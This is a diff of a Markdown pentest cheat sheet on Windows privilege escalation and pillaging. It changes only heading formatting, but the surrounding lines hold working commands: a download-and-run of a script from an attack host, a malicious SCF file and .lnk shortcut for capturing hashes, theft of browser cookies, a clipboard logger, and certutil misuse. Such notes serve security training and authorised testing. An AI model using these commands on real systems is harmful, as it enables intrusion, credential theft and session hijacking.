@@ -183,7 +183,7 @@ C:\Program Files\Windows PowerShell\*
 
 ### Interacting with Users
 
-#### Process Command Lines
+#### **Process Command Lines**
 
 ##### Monitoring for Process Command Lines
 
@@ -208,7 +208,7 @@ We can host the script on our attack machine and execute it on the target host a
 PS C:\> IEX (iwr 'http://<ip>/procmon.ps1') 
 ```
 
-#### SCF on a File Share
+#### **SCF on a File Share**
 
 ##### Malicious SCF File
 
@@ -222,7 +222,7 @@ IconFile=\\<ip>\share\legit.ico
 Command=ToggleDesktop
 ``` 
 
-#### Capturing Hashes with a Malicious .lnk File
+#### **Capturing Hashes with a Malicious .lnk File**
 
 Using SCFs no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious .lnk file. We can use various tools to generate a malicious .lnk file, such as [Lnkbomb](https://github.com/dievus/lnkbomb), as it is not as straightforward as creating a malicious .scf file. We can also make one using a few lines of PowerShell
 
@@ -240,7 +240,7 @@ $lnk.Save()
 
 Pillaging is the process of obtaining information from a compromised system. It can be personal information, corporate blueprints, credit card data, server information, infrastructure and network details,passwords, or other types of credentials, and anything relevant to the company or security assessment we are working on.
 
-#### Get Installed Programs via PowerShell & Registry Keys
+#### **Get Installed Programs via PowerShell & Registry Keys**
 
 ```
 PS C:\> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
@@ -248,7 +248,7 @@ PS C:\> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Wind
 PS C:\> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
 ```
 
-#### Abusing Cookies to Get Access
+#### **Abusing Cookies to Get Access**
 
 ##### Copy Firefox Cookies Database
 
@@ -273,7 +273,7 @@ PS C:\> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
 PS C:\> Invoke-SharpChromium -Command "cookies <site.com>"
 ```
 
-#### Clipboard
+#### **Clipboard**
 
 We can use the [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) script to extract user clipboard data. Start the logger by issuing the command below
 
@@ -286,7 +286,7 @@ PS C:\> Invoke-ClipboardLogger
 
 ### Miscellaneous Techniques
 
-#### LOLBAS
+#### **LOLBAS**
 
 The LOLBAS project documents binaries, scripts, and libraries that can be used for "living off the land" techniques on Windows systems. Each of these binaries, scripts and libraries is a Microsoft-signed file that is either native to the operating system or can be downloaded directly from Microsoft for example [certutil](https://lolbas-project.github.io/lolbas/Binaries/Certutil/)
 
@@ -308,7 +308,7 @@ C:\> certutil -encode file1 encodedfile
 C:\> certutil -decode encodedfile file2
 ```
 
-#### Always Install Elevated
+#### **Always Install Elevated**
 
 ##### Enumerating Always Install Elevated Settings
 
@@ -319,7 +319,7 @@ PS C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 ```
 >> if key is set to 0x1 then always install elevated exist
 
-#### Scheduled Tasks
+#### **Scheduled Tasks**
 
 ##### Enumerating Scheduled Tasks
 
@@ -334,7 +334,7 @@ PS C:\> Get-ScheduledTask | select TaskName,State
 ```
 >> By default, we can only see tasks created by our user and default scheduled tasks that every Windows operating system has. Unfortunately, we cannot list out scheduled tasks created by other users (such as admins) because they are stored in C:\Windows\System32\Tasks, which standard users do not have read access to
 
-#### User/Computer Description Field
+#### **User/Computer Description Field**
 
 ##### Checking Local User Description Field
 
